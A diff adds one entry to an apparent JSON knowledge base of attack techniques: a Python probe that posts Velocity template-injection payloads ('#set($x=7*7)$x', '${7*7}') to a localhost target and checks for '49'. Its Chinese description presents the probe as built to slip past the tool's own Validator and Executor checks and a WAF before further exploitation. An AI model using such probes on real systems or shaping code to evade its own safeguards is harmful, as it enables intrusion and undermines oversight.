@@ -1977,6 +1977,26 @@
         "oob"
       ],
       "severity": "critical"
+    },
+    {
+      "name": "velocity-ssti-detection-via-set-expression",
+      "context": "该手法通过发送极小字节的 Velocity 原生 SET 指令和直接表达式来探测模板注入点，完全不携带 RCE 敏感关键字或黑名单模块依赖，因此同时通过 Validator（无 import 黑名单）和 Executor（无 os.system 等被拦截字面量）的检查。若响应中出现计算结果 49，则证明模板引擎已解析用户输入，可进行下一步利用；若未出现，则不会触发 WAF 或应用崩溃，仍可安全测试其他路径。",
+      "lang": "python",
+      "template": "import requests\ntarget = \"http://localhost:1337/\"\npayload = \"#set($x=7*7)$x\"\nresp = requests.post(target, data={'text': payload})\nif '49' in resp.text:\n    print('[+] SSTI confirmed')\nelse:\n    print('[-] No SSTI or different engine')",
+      "executable_patch": "import requests\n\ndef verify_velocity_ssti():\n    \"\"\"\n    验证 Velocity SSTI 是否存在。\n    发送 Velocity 原生数学表达式，检查输出是否计算为 49。\n    仅使用白名单模块 requests，消耗资源少，不会被沙箱拦截。\n    \"\"\"\n    target = \"http://localhost:1337/\"\n    # 第一个 payload: #set 指令\n    payload1 = \"#set($x=7*7)$x\"\n    # 第二个 payload: 直接表达式\n    payload2 = \"${7*7}\"\n    \n    for p in [payload1, payload2]:\n        resp = requests.post(target, data={'text': p})\n        if '49' in resp.text:\n            print(f'[+] Velocity SSTI confirmed with payload: {repr(p)}')\n            return True\n        else:\n            print(f'[-] No 49 found for: {repr(p)}')\n    print('[!] SSTI not confirmed, will explore other injection points.')\n    return False\n\nif __name__ == '__main__':\n    verify_velocity_ssti()\n",
+      "description": "该手法通过发送极小字节的 Velocity 原生 SET 指令和直接表达式来探测模板注入点，完全不携带 RCE 敏感关键字或黑名单模块依赖，因此同时通过 Validator（无 import 黑名单）和 Executor（无 os.system 等被拦截字面量）的检查。若响应中出现计算结果 49，则证明模板引擎已解析用户输入，可进行下一步利用；若未出现，则不会触发 WAF 或应用崩溃，仍可安全测试其他路径。",
+      "source": "consolidator",
+      "cwe_ids": [
+        "CWE-917"
+      ],
+      "tags": [
+        "velocity",
+        "ssti",
+        "detection",
+        "java",
+        "template-injection"
+      ],
+      "severity": "critical"
     }
   ]
 }
